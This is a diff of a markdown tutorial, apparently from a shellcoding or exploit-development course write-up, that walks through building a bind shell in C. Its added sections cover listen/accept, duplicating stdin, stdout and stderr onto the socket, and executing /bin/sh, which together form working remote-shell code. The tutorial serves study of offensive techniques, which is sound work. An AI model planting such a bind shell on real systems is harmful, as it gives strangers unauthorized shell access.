@@ -103,7 +103,7 @@ Also note that we use ```htons``` and ```hton1``` functions to convert the addre
 ```c
 int sockfd = socket(AF_INET, SOCK_STREAM, 0);
 ```
-The ```socket()``` function takes three arguments, shown by the manpage exerpt below. These parameters be stored in the ```sockfd``` variable for later use in binding, listening and accepting:
+The ```socket()``` function takes three arguments, shown by the manpage exerpt below. These parameters will be stored in the ```sockfd``` variable for later use in binding, listening and accepting:
 
 ```c
 #include <sys/types.h>          /* See NOTES */
@@ -120,4 +120,40 @@ The ```socket()``` function takes three arguments, shown by the manpage exerpt b
 //Bind Socket
 bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
 ```
-This is where we assign an IP and port to the socket, using the ```sockfd``` variable from before, along with the address structure and the size of the address structure, which is supposed the be 16 bytes.
+This is where we assign an IP and port to the socket, using the ```sockfd``` variable from before, along with the address structure and the size of the address structure, which is supposed to be 16 bytes.
+
+#### Listening and Accepting
+```c
+//Listen
+listen(sockfd, 0);
+
+//Accept
+int stdfd = accept(sockfd, NULL, NULL);
+```
+The ```listen()``` function takes two arguments:
+- ```int sockfd```: The socket descriptor from before.
+- ```int backlog```: Used to specify the queuing of connections. In our case, we set ```backlog``` to 0, as there is only one connection that we need to be concerned with.
+
+The ```accept()``` function takes three arguments:
+- ```int sockfd```: The socket descriptor from before.
+- ```struct sockaddr *addr```: The IP of the host. ```NULL``` in our case, as we don't need setup anything for the peer socket.
+- ```struct sockaddr *addr```: The addr length of the peer socket. Again, ```NULL```.
+
+After this, the program starts listening for any incoming connections. After it recives one, the ```accept()``` will return a file descriptor for the accepted socket. This is what we will use in order to duplicate our standard file descriptors.
+
+#### Duplicating standard file descriptors
+```c
+//Duplicate Standard File Descriptors
+for (int i = 0; i < 3; i++)
+{
+    dup2(stdfd, i);
+}
+```
+We need to duplicate stdin, stdout and stderr to the socket in order to redirect input and output from the connection to the socket.
+
+#### Executing a shell
+```c
+//Execute Shell
+execve("/bin/sh", NULL, NULL);
+return 0;
+```
